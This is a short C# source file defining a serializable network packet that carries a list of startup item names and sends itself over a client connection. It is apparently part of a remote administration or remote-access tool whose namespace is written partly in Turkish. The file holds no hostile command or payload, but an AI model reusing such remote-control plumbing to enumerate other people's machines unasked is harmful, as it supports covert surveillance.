using System.Collections.Generic;
using System;
using xServer.KuuhakuCekirdek.Ağ;

namespace xServer.KuuhakuCekirdek.Paketler.ClientPaketleri
{
    [Serializable]
    public class GetStartupItemsResponse : IPacket
    {
        public List<string> StartupItems { get; set; }

        public GetStartupItemsResponse()
        {
        }

        public GetStartupItemsResponse(List<string> startupitems)
        {
            this.StartupItems = startupitems;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}